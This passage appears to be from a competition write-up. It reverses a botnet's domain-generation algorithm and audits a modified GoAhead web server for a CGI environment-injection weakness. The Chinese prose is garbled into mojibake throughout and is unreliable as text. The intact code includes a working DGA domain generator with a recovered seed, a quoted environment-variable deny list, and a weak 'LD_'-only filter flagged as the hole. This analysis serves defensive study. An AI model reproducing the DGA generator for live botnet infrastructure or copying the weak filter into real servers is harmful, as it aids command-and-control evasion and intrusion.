class="line">1,725,1450,2176,5821,6553,34340,35110,35881,38975,39751,67541,68353,69166,102506,</span><br></pre></td></tr></table></figure><p>è¿™äº›å¯¹åº”çš„åŸŸåéƒ½æ˜¯åœ¨è¾“å‡º13mrjyvjjp4azbbkt7ä¹‹åè¾“å‡ºçš„ï¼Œè¾“å‡ºçš„æ•°å­—å°±æ˜¯åç§»åŸŸåæ•°é‡ã€‚</p><p>ç„¶åæˆ‘ä»¬æŠŠ500500ä¸ªåŸŸåä¸­è¾“å‡ºåŸŸåçš„indexåˆ—å‡ºæ¥ï¼Œéå†æ‰€æœ‰indexï¼Œå¦‚æœå¯¹äºä¸Šé¢çš„æ¯ä¸ªåç§»ï¼ŒindexåŠ ä¸Šåç§»çš„ç»“æœä¾ç„¶åœ¨indexçš„listä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ‰¾åˆ°13mrjyvjjp4azbbkt7çš„indexï¼ˆå³13mrjyvjjp4azbbkt7æ˜¯ç¨‹åºç”Ÿæˆçš„ç¬¬å‡ ä¸ªåŸŸåï¼‰ã€‚</p><p>Pythonè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">index_list = []</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1001</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    index_list.append(num)</span><br><span class="line">b = [<span class="number">1</span>, <span class="number">725</span>, <span class="number">1450</span>, <span class="number">2176</span>, <span class="number">5821</span>, <span class="number">6553</span>, <span class="number">34340</span>, <span class="number">35110</span>, <span class="number">35881</span>, <span class="number">38975</span>, <span class="number">39751</span>, <span class="number">67541</span>, <span class="number">68353</span>, <span class="number">69166</span>, <span class="number">102506</span>]</span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> index_list:</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">        <span class="keyword">if</span> (a + i - <span class="number">1</span>) <span class="keyword">not</span> <span class="keyword">in</span> index_list:</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        index = a</span><br><span class="line">        print(a)</span><br></pre></td></tr></table></figure><p>è¾“å‡º261726ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªåŸŸåæ˜¯ç¨‹åºéšæœºç”Ÿæˆçš„ç¬¬261726ä¸ªåŸŸåã€‚</p><p>ç°åœ¨æˆ‘ä»¬éœ€è¦é€šè¿‡ç°åœ¨çš„çŠ¶æ€ï¼Œè¿˜åŸåˆå§‹ç§å­ã€‚é€’æ¨å…¬å¼æ˜¯<code>holdrand = holdrand * 214013L + 2531011L</code>ï¼Œè¿™é‡Œlongç±»å‹ä¼šäº§ç”Ÿæº¢å‡ºï¼Œå¯èƒ½å‡ºç°è´Ÿæ•°ï¼Œå¯¼è‡´æ— æ³•ç›´æ¥é€†æ¨å›å»ã€‚</p><p>æŸ¥é˜…cè¯­è¨€å­˜å‚¨longç±»å‹çš„ç›¸å…³çŸ¥è¯†ï¼ŒåŸç†æ˜¯ä¸€ä¸ªlongç±»å‹ç”¨32bitå­˜å‚¨ï¼Œæœ€é«˜ä½ä½œä¸ºæ­£è´Ÿæ ‡å¿—ä½ï¼Œå…¶ä½™31bitè®°å½•å€¼ï¼Œå¦‚æœè®¡ç®—ç»“æœè¶…å‡º32bitï¼Œé‚£å°±åªå–ä½32bitã€‚</p><p>è¿™é‡Œæƒ³äº†å¾ˆä¹…å¦‚ä½•é€†æ¨è§£æ–¹ç¨‹ï¼Œæœ€åå‘ç°å…¶å®ä¸ç”¨ç®¡ä»€ä¹ˆæ­£è´Ÿï¼Œå› ä¸ºç”Ÿæˆçš„éšæœºæ•°æ˜¯holdrand 32ä½ä¸­çš„é«˜16ä½ï¼Œæ— è®ºæ€ä¹ˆæº¢å‡ºï¼Œåªè¦å…³å¿ƒholdrandä½32ä½å°±å¥½äº†ï¼Œå³ä½¿æ­£è´Ÿæ ‡å¿—ä½æ˜¯1ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å½“æˆæ­£å¸¸çš„32bitæ­£æ•°æ¥è®¡ç®—ã€‚è¿™æ ·å¯ä»¥æŠŠé—®é¢˜è½¬æˆè§£åŒä½™æ–¹ç¨‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a*x+b&#x3D;c mod n</span><br></pre></td></tr></table></figure><p>næ˜¯2^32ï¼Œaæ˜¯214013Lï¼Œbæ˜¯2531011Lï¼Œè§£æ–¹ç¨‹ç›´æ¥å‡bå†ä¹˜é€†å…ƒå°±å¥½äº†ã€‚</p><p>è¿™ä¸ªåŸŸåæ˜¯ç¬¬261726ä¸ªç”Ÿæˆçš„åŸŸåï¼Œæˆ‘ä»¬åªéœ€è¦é€†æ¨ (261726-1)*19æ¬¡çŠ¶æ€ï¼Œå°±å¯ä»¥è¿˜åŸåˆ°æœ€åˆçš„seedã€‚</p><p>Pythonè„šæœ¬ï¼š    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">index = <span class="number">261726</span></span><br><span class="line">seed = <span class="number">682174533</span></span><br><span class="line">a_inv = invert(<span class="number">214013</span>, <span class="number">2</span> ** <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv</span>():</span></span><br><span class="line">    <span class="keyword">global</span> seed</span><br><span class="line">    seed = ((seed - <span class="number">2531011</span>) * a_inv) % (<span class="number">2</span> ** <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index<span class="number">-1</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">        inv()</span><br><span class="line"><span class="built_in">print</span> seed</span><br></pre></td></tr></table></figure><p>å¾—åˆ°åˆå§‹seedæ˜¯77980108ï¼Œç„¶åç”ŸæˆdgaåŸŸåå°±å¥½äº†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> seed = <span class="number">77980108</span>;</span><br><span class="line"><span class="keyword">char</span> res[<span class="number">24</span>];</span><br><span class="line"><span class="keyword">char</span> v11[<span class="number">36</span>]=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz123456789&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> *ext[]= &#123;<span class="string">&quot;.ru&quot;</span>,<span class="string">&quot;.com&quot;</span>,<span class="string">&quot;.net&quot;</span>,<span class="string">&quot;.biz&quot;</span>,<span class="string">&quot;.cn&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> v1 = <span class="number">1</span>;</span><br><span class="line">srand(seed);</span><br><span class="line"><span class="keyword">int</span> v2,v3,v5,len,v7;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">res[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">v7 = <span class="number">18</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">len=<span class="built_in">strlen</span>(res);</span><br><span class="line">res[len]=v11[rand()%<span class="number">34</span>];</span><br><span class="line">res[len+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">v3 = v7-- == <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(!v3);</span><br><span class="line">v5 = rand();</span><br><span class="line"><span class="keyword">if</span>(v2==(v1<span class="number">-1</span>))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s%s\n&quot;</span>,res,ext[v5%<span class="number">5</span>]);</span><br><span class="line">&#125;</span><br><span class="line">++v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(v1!=v2);</span><br><span class="line">++v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(v1!=<span class="number">1001</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°ç»™çš„100ä¸ªåŸŸåéƒ½åœ¨æˆ‘ä»¬ç”Ÿæˆçš„åŸŸåé‡Œï¼Œè¯æ˜ç­”æ¡ˆæ— è¯¯ã€‚</p><h1 id="åƒµå°¸ç½‘ç»œåˆ†æé¢˜ç›®ä¸€-Botnetè¿½è¸ªâ€”è¿½åˆ°æˆ‘å°±è®©ä½ å˜¿å˜¿å˜¿"><a href="#åƒµå°¸ç½‘ç»œåˆ†æé¢˜ç›®ä¸€-Botnetè¿½è¸ªâ€”è¿½åˆ°æˆ‘å°±è®©ä½ å˜¿å˜¿å˜¿" class="headerlink" title="åƒµå°¸ç½‘ç»œåˆ†æé¢˜ç›®ä¸€-Botnetè¿½è¸ªâ€”è¿½åˆ°æˆ‘å°±è®©ä½ å˜¿å˜¿å˜¿"></a>åƒµå°¸ç½‘ç»œåˆ†æé¢˜ç›®ä¸€-Botnetè¿½è¸ªâ€”è¿½åˆ°æˆ‘å°±è®©ä½ å˜¿å˜¿å˜¿</h1><p>è¿™ä¸ªé¢˜æˆ‘è¯„ä¼°åå‡ºé¢˜äººæ ¹æ®æˆ‘çš„åé¦ˆï¼Œå¯¹é¢˜ç›®åšäº†ä¸€å®šçš„è°ƒæ•´ã€‚</p><h2 id="èµ›é¢˜ä¿¡æ¯-1"><a href="#èµ›é¢˜ä¿¡æ¯-1" class="headerlink" title="èµ›é¢˜ä¿¡æ¯"></a>èµ›é¢˜ä¿¡æ¯</h2><h3 id="è®¾è®¡è¯´æ˜-1"><a href="#è®¾è®¡è¯´æ˜-1" class="headerlink" title="è®¾è®¡è¯´æ˜"></a>è®¾è®¡è¯´æ˜</h3><p>Datacon softwareæ˜¯ä¸€å®¶ä»¥IOTäº§å“å¼€å‘ä¸ºä¸»è¦ä¸šåŠ¡çš„å…¬å¸ï¼Œä»–ä»¬åœ¨å¼€æºWeb server GoAheadçš„åŸºç¡€ä¸Šå®šåˆ¶äº†ä¸€æ¬¾åä¸ºXGoAheadçš„Web serverä½¿ç”¨åœ¨è‡ªå·±çš„äº§å“ä¸­ã€‚æŸå¤©Datacon softwareæ”¶åˆ°å¤–éƒ¨æƒ…æŠ¥åé¦ˆï¼šå…¶å®šåˆ¶å¼€å‘çš„XGoAheadç–‘ä¼¼å­˜åœ¨æ¼æ´ï¼Œä¸”å·²é­åˆ°åƒµå°¸ç½‘ç»œåˆ©ç”¨ã€‚ç°åœ¨ä½ çš„ä»»åŠ¡æ˜¯æ‰¾åˆ°è¿™ä¸ªåƒµå°¸ç½‘ç»œçš„C2åŸŸåã€‚</p><h3 id="ä»£ç ä¸æ•°æ®è¯´æ˜"><a href="#ä»£ç ä¸æ•°æ®è¯´æ˜" class="headerlink" title="ä»£ç ä¸æ•°æ®è¯´æ˜"></a>ä»£ç ä¸æ•°æ®è¯´æ˜</h3><p>ç›®å‰å·²çŸ¥çš„çº¿ç´¢å¦‚ä¸‹</p><ul><li>XGoAheadæœ€æ–°ç‰ˆæœ¬æºç </li><li>XGoAheadæœ€æ–°ç‰ˆæœ¬æºç </li><li>Passive DNSæ•°æ®</li></ul><p>æä¾›çš„XGoAheadè½¯ä»¶ä»£ç åªèƒ½è¿è¡Œåœ¨Linuxæ“ä½œç³»ç»Ÿä¸Šä¸”é¡»ä½¿ç”¨makeå·¥å…·æ„å»ºï¼Œæ¨èä½¿ç”¨Ubuntu 18.04 x86_64æˆ–Centos 7 x86_64ï¼Œä¸æ¨èåœ¨å…¶ä»–ç³»ç»Ÿ/å¹³å°ä¸Šä½¿ç”¨ã€‚</p><p>æä¾›çš„å…¬ç½‘Webèœœç½æ•°æ®ä»…ä¸ºèœœç½æœåŠ¡å™¨æ¥æ”¶åˆ°çš„æ¥è‡ªå…¬ç½‘çš„æµé‡ï¼Œè¿œä¸èƒ½è¦†ç›–æ•´ä¸ªäº’è”ç½‘çš„æƒ…å†µï¼Œä»…ä¸ºè§‚æµ‹æ ·æœ¬ã€‚</p><p>æä¾›çš„Passive DNSä»…ä¸ºå°èŒƒå›´Client IPçš„æ•°æ®ï¼Œè¿œä¸èƒ½è¦†ç›–æ•´ä¸ªäº’è”ç½‘çš„æƒ…å†µï¼Œä»…ä¸ºè§‚æµ‹æ ·æœ¬ã€‚</p><h3 id="æ•°æ®æ ¼å¼"><a href="#æ•°æ®æ ¼å¼" class="headerlink" title="æ•°æ®æ ¼å¼"></a>æ•°æ®æ ¼å¼</h3><ul><li>Webèœœç½æ•°æ®</li></ul><p>è¯¥æ•°æ®ä½äºå‹ç¼©åŒ…ä¸­çš„honeypot.jsonæ–‡ä»¶ï¼Œå…¶æ¥æºäºå…¬ç½‘éƒ¨ç½²çš„Webèœœç½ï¼Œæ•°æ®é‡‡é›†çš„æ—¶é—´èŒƒå›´æ˜¯2020å¹´5æœˆã€‚æ–‡ä»¶ä¸­æ¯ä¸€è¡Œä¸ºä¸€ä¸ªJSONå­—ç¬¦ä¸²ï¼Œä»£è¡¨ä¸€æ¡èœœç½æ—¥å¿—ï¼Œå³é’ˆå¯¹èœœç½çš„ä¸€æ¬¡HTTPè¯·æ±‚ï¼Œè¯¦ç»†å­—æ®µè§£é‡Šå¦‚ä¸‹ï¼š</p><table><thead><tr><th>å­—æ®µ</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td>eventid</td><td>äº‹ä»¶ç±»å‹ï¼Œæ•°æ®æ–‡ä»¶ä¸­å‡ä¸ºâ€œattack.webâ€</td></tr><tr><td>method</td><td>HTTP method</td></tr><tr><td>body</td><td>HTTP body</td></tr><tr><td>url</td><td>HTTP request URL</td></tr><tr><td>header</td><td>HTTP request headers</td></tr><tr><td>path</td><td>HTTP request path</td></tr><tr><td>protocol</td><td>åº”ç”¨å±‚åè®®ï¼Œæ•°æ®æ–‡ä»¶ä¸­å‡ä¸ºâ€œhttpâ€</td></tr><tr><td>src_ip</td><td>æºIPåœ°å€ï¼ˆå·²åŠ ç›å“ˆå¸Œå¤„ç†ï¼‰</td></tr><tr><td>src_port</td><td>æºç«¯å£</td></tr><tr><td>dst_port</td><td>ç›®çš„ç«¯å£</td></tr><tr><td>timestamp</td><td>æ•°æ®æ•è·çš„æ—¶é—´ï¼ˆæ ¼æ—å°¼æ²»æ—¶é—´ï¼‰</td></tr></tbody></table><ul><li>Passive DNS æ•°æ®</li></ul><p>è¯¥æ•°æ®ä½äºaccess.cvsä¸­ï¼Œè¯¥æ•°æ®è¡¨ç¤ºDNSè¯·æ±‚è®°å½•ï¼Œå³DNSå®¢æˆ·ç«¯IPè¯·æ±‚è§£æçš„åŸŸåè®°å½•ã€‚è¯¥æ•°æ®é‡‡é›†äº2020å¹´5æœˆçš„æŸä¸€å¤©ã€‚æ ¼å¼ä¸ºCSVï¼Œæ¯è¡Œä¸‰ä¸ªå­—æ®µï¼Œåˆ†åˆ«ä¸ºâ€œåŸŸåâ€ã€â€œå®¢æˆ·ç«¯IPï¼ˆå·²åŠ ç›å“ˆå¸Œå¤„ç†ï¼‰â€ã€â€œä¸€å°æ—¶å†…çš„è¯·æ±‚æ¬¡æ•°â€ï¼Œè¯·æ±‚æ—¶é—´å·²å»é™¤ï¼ˆè„±æ•ï¼‰ã€‚</p><h3 id="æäº¤å½¢å¼-1"><a href="#æäº¤å½¢å¼-1" class="headerlink" title="æäº¤å½¢å¼"></a>æäº¤å½¢å¼</h3><p>é¢˜ç›®ä¿®æ”¹å‰æäº¤å†…å®¹ï¼š</p><ul><li>å¯èƒ½åˆ©ç”¨XGoAheadæ¼æ´çš„åƒµå°¸ç½‘ç»œçš„C2åŸŸå</li></ul><p>ç­”æ¡ˆé€šè¿‡æ–‡æœ¬æ–‡ä»¶æäº¤ï¼Œå¦‚æœæ‰¾åˆ°äº†å¤šä¸ªC2åŸŸååˆ™ä¸€è¡Œä¸€ä¸ªC2åŸŸåã€‚æ–‡ä»¶ä½¿ç”¨ASCIIç¼–ç ï¼Œæ¢è¡Œç¬¦ä¸ºâ€œ\nâ€ï¼Œæ–‡ä»¶æœ«å°¾ç•™ä¸€ä¸ªç©ºè¡Œã€‚</p><ul><li>XGoAheadä¸­æ¼æ´æ‰€åœ¨çš„æ–‡ä»¶åå’Œå‡½æ•°åï¼ˆå¦‚æœXGoAheadå­˜åœ¨æ¼æ´åˆ™éœ€è¦æäº¤è¯¥ç­”æ¡ˆï¼‰</li></ul><p>é€šè¿‡æ–‡æœ¬æ–‡ä»¶æäº¤ï¼Œæ ¼å¼ä¸ºâ€œæ–‡ä»¶å:å‡½æ•°åâ€ï¼ˆå†’å·ä¸ºè‹±æ–‡å†’å·ï¼Œå¤§å°å†™æ•æ„Ÿï¼‰ï¼Œå¦‚å­˜åœ¨å¤šä¸ªæ¼æ´åˆ™ä¸€è¡Œä¸€ä¸ªæ¼æ´ï¼Œæ¢è¡Œç¬¦ä¸ºâ€œ\nâ€ï¼Œæ–‡ä»¶æœ«å°¾ç•™ä¸€ä¸ªç©ºè¡Œã€‚</p><p>é¢˜ç›®ä¿®æ”¹åæäº¤å†…å®¹ï¼š</p><ul><li>æäº¤å¯èƒ½æ„ŸæŸ“åƒµå°¸ç½‘ç»œçš„IP</li></ul><h2 id="è§£é¢˜è¿‡ç¨‹-1"><a href="#è§£é¢˜è¿‡ç¨‹-1" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h2><p>å…ˆè®²ä¸‹å½“æ—¶åšé¢˜çš„è¿‡ç¨‹ã€‚</p><p>é¢˜ç›®è¦æ±‚æ‰¾åˆ°è¿™ä¸ªåƒµå°¸ç½‘ç»œçš„C2åŸŸåï¼Œå¹¶æ‰¾å‡º xgoahead æ¼æ´ç‚¹ã€‚</p><p>åšé¢˜æ€è·¯åº”è¯¥å¤§è‡´æ˜¯è¿™æ ·</p><ol><li>æºç å®¡è®¡ï¼Œæ‰¾å‡ºæ¼æ´ç‚¹</li><li>æ ¹æ®æ¼æ´ï¼Œä»èœœç½æµé‡ä¸­æ‰¾å‡ºæ”»å‡»æµé‡</li><li>æ ¹æ®æ”»å‡»æµé‡çš„æºIPï¼Œåœ¨ passive dns ä¸­æ‰¾å‡º C2 åŸŸåã€‚</li></ol><h3 id="æºç å®¡è®¡"><a href="#æºç å®¡è®¡" class="headerlink" title="æºç å®¡è®¡"></a>æºç å®¡è®¡</h3><p>æ—¢ç„¶æ˜¯åŸºäº goahead æ”¹çš„ï¼Œå…ˆæŠŠ goahead æºç æ‹‰ä¸‹æ¥ diff ä¸€ä¸‹ã€‚goahead ç½‘ä¸Šçš„æºç ä¸‹è½½é“¾æ¥å¤§å¤šæŒ‚äº†ï¼Œgithubä¹Ÿæ²¡äº†ï¼Œåœ¨è¿™é‡Œä¸‹åˆ°äº† 4.1.3 çš„æºç ï¼š<a href="https://www.embedthis.com/goahead/download.html">https://www.embedthis.com/goahead/download.html</a></p><p>æ‹‰ä¸‹æ¥ diff ä¸€ä¸‹ã€‚</p><p><img src="/2020/08/16/2020-Datacon/image-20200723111342633.png" alt="image-20200723111342633"></p><p>ä¸»è¦çš„æ”¹åŠ¨å°±æ˜¯å¢åŠ äº†ä¸€ä¸ª xcgiï¼Œè¿™ä¸ª xcgi çœ‹èµ·æ¥è·Ÿ cgi åŠŸèƒ½å·®ä¸å¤šã€‚å…¶ä»–æ²¡å•¥è‡ªå·±å†™çš„åŠŸèƒ½ä»£ç ï¼Œæœä¸€æ³¢ goahead çš„æ¼æ´ï¼š</p><p>CVE-2019-5096 æœ‰ä¸ªRCEï¼Œå‚è€ƒ <a href="https://www.anquanke.com/post/id/194322">https://www.anquanke.com/post/id/194322</a>ï¼Œä¸è¿‡ xgoahead å·²ç»ä¿®å¤äº†ã€‚</p><p>CVE-2017-17562 æœ‰ä¸ª cgi çš„ RCEï¼Œå‚è€ƒ <a href="https://xz.aliyun.com/t/6407#toc-2">https://xz.aliyun.com/t/6407#toc-2</a>ï¼Œ xgoahead ä¹Ÿä¿®å¤äº†ï¼Œæ˜¯å®˜æ–¹çš„è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">envp = walloc(envpsize * <span class="keyword">sizeof</span>(<span class="keyword">char</span>*));</span><br><span class="line"><span class="keyword">if</span> (wp-&gt;vars) &#123;</span><br><span class="line">    <span class="keyword">for</span> (n = <span class="number">0</span>, s = hashFirst(wp-&gt;vars); s != <span class="literal">NULL</span>; s = hashNext(wp-&gt;vars, s)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;content.valid &amp;&amp; s-&gt;content.type == <span class="built_in">string</span>) &#123;</span><br><span class="line">            vp = strim(s-&gt;name.value.<span class="built_in">string</span>, <span class="number">0</span>, WEBS_TRIM_START);</span><br><span class="line">            <span class="keyword">if</span> (smatch(vp, <span class="string">&quot;REMOTE_HOST&quot;</span>) || smatch(vp, <span class="string">&quot;HTTP_AUTHORIZATION&quot;</span>) ||</span><br><span class="line">                smatch(vp, <span class="string">&quot;IFS&quot;</span>) || smatch(vp, <span class="string">&quot;CDPATH&quot;</span>) ||</span><br><span class="line">                smatch(vp, <span class="string">&quot;PATH&quot;</span>) || sstarts(vp, <span class="string">&quot;LD_&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (s-&gt;arg != <span class="number">0</span> &amp;&amp; *ME_GOAHEAD_CGI_VAR_PREFIX != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">                envp[n++] = sfmt(<span class="string">&quot;%s%s=%s&quot;</span>, ME_GOAHEAD_CGI_VAR_PREFIX, s-&gt;name.value.<span class="built_in">string</span>,</span><br><span class="line">                    s-&gt;content.value.<span class="built_in">string</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                envp[n++] = sfmt(<span class="string">&quot;%s=%s&quot;</span>, s-&gt;name.value.<span class="built_in">string</span>, s-&gt;content.value.<span class="built_in">string</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            trace(<span class="number">0</span>, <span class="string">&quot;Env[%d] %s&quot;</span>, n, envp[n<span class="number">-1</span>]);</span><br><span class="line">            <span class="keyword">if</span> (n &gt;= envpsize) &#123;</span><br><span class="line">                envpsize *= <span class="number">2</span>;</span><br><span class="line">                envp = wrealloc(envp, envpsize * <span class="keyword">sizeof</span>(<span class="keyword">char</span> *));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¢åŠ äº†è¿‡æ»¤ã€‚</p><p>ä½†æ˜¯ xcgi æ²¡æœ‰è¿™ä¹ˆä¸¥æ ¼çš„è¿‡æ»¤ï¼Œåªè¿‡æ»¤äº† LD_:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Check if request is safe.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">beSafe</span><span class="params">(Webs *wp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;query != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(wp-&gt;query, <span class="string">&quot;LD_&quot;</span>) != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåº”è¯¥æ˜¯æ¼æ´ç‚¹ã€‚ï¼ˆ<del>å¹¶ä¸çŸ¥é“å¦‚ä½• bypass</del>ï¼‰</p><p>è·Ÿé‚£ä¸ªæ¼æ´ï¼Œè¿˜å‘ç°ä¸€å¤„å¥‡æ€ªçš„åœ°æ–¹:</p><p><img src="/2020/08/16/2020-Datacon/image-20200723152238069.png" alt="image-20200723152238069"></p><p>Xgoahead å¯¹ä¸´æ—¶æ–‡ä»¶çš„æ–‡ä»¶åå¤„ç†ï¼ŒæŠŠ count++ å–æ¶ˆäº†ï¼Œé‚£ä¸€ç›´éƒ½æ˜¯åªèƒ½å†™é‚£ä¸€ä¸ªæ–‡ä»¶ã€‚</p><h3 id="æ•°æ®åˆ†æ"><a href="#æ•°æ®åˆ†æ" class="headerlink" title="æ•°æ®åˆ†æ"></a>æ•°æ®åˆ†æ</h3><p>æ•°æ®é‡è¾ƒå¤§ï¼Œåšåˆ†æå¤„ç†æ¯”è¾ƒéº»çƒ¦ï¼Œè€ƒè™‘å¯¼å…¥æ•°æ®åº“ï¼Œæ–¹ä¾¿åç»­æ“ä½œã€‚è¯•äº†å¾ˆå¤šç§æ–¹æ³•ï¼Œæœ€åè¿˜æ˜¯ç”¨ Python è§£ææ•°æ®å†å…¥åº“ã€‚</p><p>å€’å…¥æ•°æ®åº“è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">db = 